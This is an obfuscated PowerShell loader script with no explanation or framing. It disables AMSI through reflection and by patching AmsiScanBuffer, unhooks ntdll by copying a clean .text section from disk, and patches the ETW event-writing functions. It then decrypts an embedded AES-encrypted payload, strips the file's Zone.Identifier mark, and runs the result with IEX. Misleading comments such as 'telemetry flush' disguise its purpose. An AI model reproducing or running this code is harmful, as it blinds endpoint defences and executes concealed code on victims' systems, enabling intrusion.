try { [Ref].Assembly.GetType(('System.Management.Automation.Amsi'+'Utils')).GetField(('amsi'+'Init'+'Failed'),'NonPublic,Static').SetValue($null,$true) } catch {}
# telemetry flush c516b9
try {
    $z255d0add = "cHVibGljIGNsYXNzIFB7W1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5EbGxJbXBvcnQoImtlcm5lbDMyLmRsbCIpXXB1YmxpYyBzdGF0aWMgZXh0ZXJuIFN5c3RlbS5JbnRQdHIgTG9hZExpYnJhcnkoc3RyaW5nIHMpO1tTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuRGxsSW1wb3J0KCJrZXJuZWwzMi5kbGwiKV1wdWJsaWMgc3RhdGljIGV4dGVybiBTeXN0ZW0uSW50UHRyIEdldFByb2NBZGRyZXNzKFN5c3RlbS5JbnRQdHIgbSxzdHJpbmcgZik7W1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5EbGxJbXBvcnQoImtlcm5lbDMyLmRsbCIpXXB1YmxpYyBzdGF0aWMgZXh0ZXJuIGJvb2wgVmlydHVhbFByb3RlY3QoU3lzdGVtLkludFB0ciBhLFN5c3RlbS5VSW50UHRyIHMsdWludCBmLG91dCB1aW50IG8pO1tTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuRGxsSW1wb3J0KCJrZXJuZWwzMi5kbGwiKV1wdWJsaWMgc3RhdGljIGV4dGVybiBTeXN0ZW0uSW50UHRyIENyZWF0ZUZpbGUoc3RyaW5nIGYsdWludCBhLHVpbnQgc2gsU3lzdGVtLkludFB0ciBzYSx1aW50IGNkLHVpbnQgZmwsU3lzdGVtLkludFB0ciB0KTtbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLkRsbEltcG9ydCgia2VybmVsMzIuZGxsIildcHVibGljIHN0YXRpYyBleHRlcm4gU3lzdGVtLkludFB0ciBDcmVhdGVGaWxlTWFwcGluZyhTeXN0ZW0uSW50UHRyIGYsU3lzdGVtLkludFB0ciBzYSx1aW50IGZsLHVpbnQgbWgsdWludCBtbCxzdHJpbmcgbik7W1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5EbGxJbXBvcnQoImtlcm5lbDMyLmRsbCIpXXB1YmxpYyBzdGF0aWMgZXh0ZXJuIFN5c3RlbS5JbnRQdHIgTWFwVmlld09mRmlsZShTeXN0ZW0uSW50UHRyIG0sdWludCBhLHVpbnQgaG8sdWludCBsbyxTeXN0ZW0uVUludFB0ciBzeik7W1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5EbGxJbXBvcnQoImtlcm5lbDMyLmRsbCIpXXB1YmxpYyBzdGF0aWMgZXh0ZXJuIGJvb2wgVW5tYXBWaWV3T2ZGaWxlKFN5c3RlbS5JbnRQdHIgYik7W1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5EbGxJbXBvcnQoImtlcm5lbDMyLmRsbCIpXXB1YmxpYyBzdGF0aWMgZXh0ZXJuIGJvb2wgQ2xvc2VIYW5kbGUoU3lzdGVtLkludFB0ciBoKTtbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLkRsbEltcG9ydCgibXN2Y3J0LmRsbCIpXXB1YmxpYyBzdGF0aWMgZXh0ZXJuIFN5c3RlbS5JbnRQdHIgbWVtY3B5KFN5c3RlbS5JbnRQdHIgZCxTeXN0ZW0uSW50UHRyIHMsU3lzdGVtLlVJbnRQdHIgbik7fQo="
    Add-Type -TypeDefinition ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($z255d0add)))
    $o = 0
    $z767517 = [IO.Path]::Combine([Environment]::GetFolderPath('System'), ('nt'+'dll'+'.dll'))
    $zd99b02 = [P]::CreateFile($z767517, 0x80000000, 3, [IntPtr]::Zero, 3, 0, [IntPtr]::Zero)
    if ($zd99b02 -ne [IntPtr]::Zero -and $zd99b02 -ne [IntPtr](-1)) {
        $z74ba9cf1 = [P]::CreateFileMapping($zd99b02, [IntPtr]::Zero, 2, 0, 0, $null)
        if ($z74ba9cf1 -ne [IntPtr]::Zero) {
            $za59e1 = [P]::MapViewOfFile($z74ba9cf1, 4, 0, 0, [UIntPtr]::Zero)
            if ($za59e1 -ne [IntPtr]::Zero) {
                $z9fbbd45e = [P]::LoadLibrary(('nt'+'dll'))
                $ze1df86 = [Runtime.InteropServices.Marshal]::ReadInt32($za59e1, 0x3C)
                $zd1a70 = [Runtime.InteropServices.Marshal]::ReadInt16($za59e1, $ze1df86+6)
                $z1eb3ae3 = [Runtime.InteropServices.Marshal]::ReadInt16($za59e1, $ze1df86+20)
                $zaf428 = $ze1df86+24+$z1eb3ae3
                for ($i=0; $i -lt $zd1a70; $i++) {
                    $za4b2dfa = [Runtime.InteropServices.Marshal]::PtrToStringAnsi([IntPtr]::Add($za59e1, $zaf428+$i*40))
# beacon timer 6cc4ef
                    if ($za4b2dfa -and $za4b2dfa.Trim([char]0) -eq '.text') {
                        $z010701d8 = [Runtime.InteropServices.Marshal]::ReadInt32($za59e1, $zaf428+$i*40+8)
                        $zb4e788 = [Runtime.InteropServices.Marshal]::ReadInt32($za59e1, $zaf428+$i*40+12)
                        $z022391f = [Runtime.InteropServices.Marshal]::ReadInt32($za59e1, $zaf428+$i*40+20)
                        [P]::VirtualProtect([IntPtr]::Add($z9fbbd45e,$zb4e788), [UIntPtr]$z010701d8, 0x40, [ref]$o) | Out-Null
                        [P]::memcpy([IntPtr]::Add($z9fbbd45e,$zb4e788), [IntPtr]::Add($za59e1,$z022391f), [UIntPtr]$z010701d8) | Out-Null
                        break
                    }
                }
                [P]::UnmapViewOfFile($za59e1) | Out-Null
            }
            [P]::CloseHandle($z74ba9cf1) | Out-Null
        }
# profile load cc518a
        [P]::CloseHandle($zd99b02) | Out-Null
    }
    $n = [P]::LoadLibrary(('nt'+'dll'))
    foreach ($fn in (('Etw'+'Event'+'Write'),('Etw'+'Event'+'Write'+'Transfer'),('Nt'+'Trace'+'Event'))) {
# beacon timer 56f07a
        $e = [P]::GetProcAddress($n, $fn)
        if ($e -ne [IntPtr]::Zero) {
            [P]::VirtualProtect($e, [UIntPtr]4, 0x40, [ref]$o) | Out-Null
            [Runtime.InteropServices.Marshal]::Copy([byte[]](0x48,0x33,0xC0,0xC3), 0, $e, 4)
        }
    }
    $h = [P]::LoadLibrary(('a'+'msi'+'.dll'))
    $a = [P]::GetProcAddress($h, ('Amsi'+'Scan'+'Buffer'))
    [P]::VirtualProtect($a, [UIntPtr]6, 0x40, [ref]$o) | Out-Null
    [Runtime.InteropServices.Marshal]::Copy([byte[]](0xB8,0x57,0x00,0x07,0x80,0xC3), 0, $a, 6)
} catch {}
$key = [Convert]::FromBase64String("mS/N3JqaMWutX/cZH5uW1/FPzegAv9KBTLlVCuTN3fE=")
$iv = [Convert]::FromBase64String("xEvGJz+WaGc0BEMEPPHw9w==")
$enc = "XdHBYrTjE6JF1oCUr4DDQgom+CB7KNTxccu4QZqpCFX3nDcr/t/fUyJgt+a1T+SyBy1VrQu++8e1LbeoUuJKp21+7CpuLxM5y6spUURIWOI9VnD+wLDJeVfh18SjS4ZbxWLQ2C5Mux/3SA8ZSpN/E752htTAtPor7J7LaskyPDKelLX2Bi7nCxLOAZvJTVKLkaA8kD2MJNEPrrfhammQCI1+YosonNEaj+wxdg4syB0RjptFtiLWCwut3KsED30BoRoOnUjRFyW/S5fhuX58MbhtqYFu8W/C1dtZ8Zjwc2VumklqU7xFxko0wqheSBteR7fFBjmeTn6YeSPAInIa13+LkecvTbKJt1FvBnVm+eT4thLG0AaklXXRyFTN2RyHdczWqfa/DEmivSo1e2ze1cFTaPN9TFvaw/e9Q0dSiiBTeSwvym/hDrFzQeFLBNRnI8xFJ6794Sz2Vk+b/2yV2mk/okTFGeZKrF90s6aAwljZZr3RUUiFM7rYDNRTcqy/O3E4SuKIqVKwaQK9Dhu3b3q4YXTzuKmsxSDowfRV6PVFnmTux8OVMLBu2LmVl1SdxfknAsx2mzNvfaRXwC5OaD314GtrZO3D7qB49U6mZKUsTEQ5lvRhWLxSLuLYOuTqDuf4gzklK1OelU4O5z3eRWbc8tvo+sah/nBh9EFa1AFzTkrqXenKhozbL9hPOTyCk0gWGlaT5L1bSyvgk2jML4TKpdStO2J9B9WtKUrYcux80t7RYX5E9VDSckoLTCFI/OuzGVKqwalNV6OV277rENIXIvhJO0BRzkka9NNP4ki2xSeYkk2q7PhPQWhBFynR9glbA/Cd+fWq7djBQ3+E7uTkW1W4AW1T+ajKK9SxVuxHoMuxi1XUUP35l8TmpnFufDnKCfbkjTdMdb/xBc3HsMrlTkxkZF5AMXDhZ+brOItEejObEy2JB4bPDLohbIC0oTNlG+vnxMNEUhQH/p9W4NkYnGi9VPTq0s/5PAFXkq3mdC8rWODbdxjGUp6SaoAQuGJbOT6DgjMiLpFIu3rKcFG8Jrznby0EqstGvaLQ5Jh80aZJk9rLDBor/OzsbURIzCi7MZnTjNVG9/nIrVwRyPSkCHTgfdgECxLPz/irXFTByRlxq0hxXEdap0ZdfxVkB8qK7HU6xyPEsBbbMPADBNX3GCBmM7XZBuhWMgFdv0IyRfDNeXSiz8WPdX7l8YiRDgzW4EHHI3vB1dXr59/4wBoKW+itwTgPTv0wp1Y2PuywWgEFTzG7edST2k3SPMwpoWDbh2ghO6uXlyHhBbZFp0zDgz1ZFZVKta6w/G6IMzw="
$aes = [System.Security.Cryptography.Aes]::Create()
$aes.Key = $key; $aes.IV = $iv
$ms = New-Object System.IO.MemoryStream(,[Convert]::FromBase64String($enc))
$cs = New-Object System.Security.Cryptography.CryptoStream($ms, $aes.CreateDecryptor(), [System.Security.Cryptography.CryptoStreamMode]::Read)
$sr = New-Object System.IO.StreamReader($cs)
$z17b2a = $sr.ReadToEnd()
$cs.Dispose(); $aes.Clear()
[Array]::Clear($key,0,$key.Length); [Array]::Clear($iv,0,$iv.Length)
$key = $null; $iv = $null; $enc = $null
$sr.Close();$cs.Close();$ms.Close()
# telemetry flush c08961
Remove-Item -LiteralPath "$($MyInvocation.MyCommand.Path):Zone.Identifier" -Force -ErrorAction SilentlyContinue
IEX $z17b2a
# telemetry flush 1c6353
